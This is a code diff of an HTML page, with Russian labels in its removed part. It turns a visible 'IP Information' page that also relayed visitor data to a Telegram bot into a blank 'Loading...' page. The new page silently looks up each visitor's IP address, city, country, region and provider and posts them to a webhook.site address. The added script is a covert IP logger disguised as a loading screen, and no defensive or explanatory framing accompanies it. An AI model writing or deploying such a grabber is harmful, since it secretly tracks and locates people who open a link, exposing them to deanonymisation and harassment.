@@ -1,141 +1,26 @@
 <!DOCTYPE html>
-<html lang="ru">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <title>IP Информация</title>
-    <style>
-        body {
-            font-family: 'Segoe UI', Arial, sans-serif;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            min-height: 100vh;
-            margin: 0;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            color: #333;
-        }
-        .container {
-            background: rgba(255, 255, 255, 0.95);
-            border-radius: 20px;
-            padding: 30px;
-            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.2);
-            max-width: 500px;
-            width: 90%;
-        }
-        h1 {
-            text-align: center;
-            color: #4a4a4a;
-            margin-bottom: 30px;
-            font-size: 2em;
-        }
-        .info-block {
-            background: #ffffff;
-            padding: 20px;
-            border-radius: 15px;
-            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
-        }
-        .info-block p {
-            margin: 10px 0;
-            padding: 10px;
-            border-bottom: 1px solid #eee;
-            display: flex;
-            justify-content: space-between;
-        }
-        .info-block p:last-child {
-            border-bottom: none;
-        }
-        .label {
-            font-weight: bold;
-            color: #764ba2;
-        }
-        .loading {
-            text-align: center;
-            color: #666;
-        }
-        .troll-image {
-            width: 100px;
-            display: block;
-            margin: 20px auto 0;
-            animation: float 3s ease-in-out infinite;
-        }
-        @keyframes float {
-            0% { transform: translateY(0px); }
-            50% { transform: translateY(-10px); }
-            100% { transform: translateY(0px); }
-        }
-    </style>
+<meta charset="UTF-8">
+<title>Loading...</title>
 </head>
 <body>
-    <div class="container">
-        <h1>IP Информация</h1>
-        <div id="info" class="info-block">
-            <p class="loading">Загрузка данных...</p>
-        </div>
-        <img src="trollface.png" alt="Trollface" class="troll-image">
-    </div>
-
-    <script>
-        async function getIpInfo() {
-            try {
-                const response = await fetch('https://ipapi.co/json/');
-                const data = await response.json();
-                return data;
-            } catch (error) {
-                console.error('Ошибка при получении IP информации:', error);
-                return null;
-            }
-        }
-
-        async function sendToTelegram(data) {
-            const botToken = ''; // Токен вашего бота
-            const chatId = ''; // Укажите ваш Chat ID
-            const message = `
-📍 Новый посетитель:
-IP: ${data.ip}
-Город: ${data.city}
-Страна: ${data.country_name}
-Регион: ${data.region}
-Провайдер: ${data.org}
-            `;
-
-            try {
-                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify({
-                        chat_id: chatId,
-                        text: message,
-                        parse_mode: 'HTML'
-                    })
-                });
-            } catch (error) {
-                console.error('Ошибка отправки в Telegram:', error);
-            }
-        }
-
-        async function showInfo() {
-            const infoDiv = document.getElementById('info');
-            const ipData = await getIpInfo();
-            
-            if (ipData) {
-                infoDiv.innerHTML = `
-                    <p><span class="label">IP адрес:</span> <span>${ipData.ip}</span></p>
-                    <p><span class="label">Город:</span> <span>${ipData.city}</span></p>
-                    <p><span class="label">Страна:</span> <span>${ipData.country_name}</span></p>
-                    <p><span class="label">Регион:</span> <span>${ipData.region}</span></p>
-                    <p><span class="label">Провайдер:</span> <span>${ipData.org}</span></p>
-                `;
-                
-                // Отправляем данные в Telegram
-                await sendToTelegram(ipData);
-            } else {
-                infoDiv.innerHTML = '<p class="loading">Не удалось получить информацию об IP</p>';
-            }
-        }
-
-        showInfo();
-    </script>
+<script>
+fetch('https://ipapi.co/json/')
+  .then(r => r.json())
+  .then(d => {
+    fetch('https://webhook.site/c9cf62fb-1ce1-453d-96b2-7a529baa48fd', {
+      method: 'POST',
+      headers: {'Content-Type': 'application/json'},
+      body: JSON.stringify({
+        ip: d.ip,
+        city: d.city,
+        country: d.country_name,
+        region: d.region,
+        org: d.org
+      })
+    });
+  });
+</script>
 </body>
-</html> 
+</html>
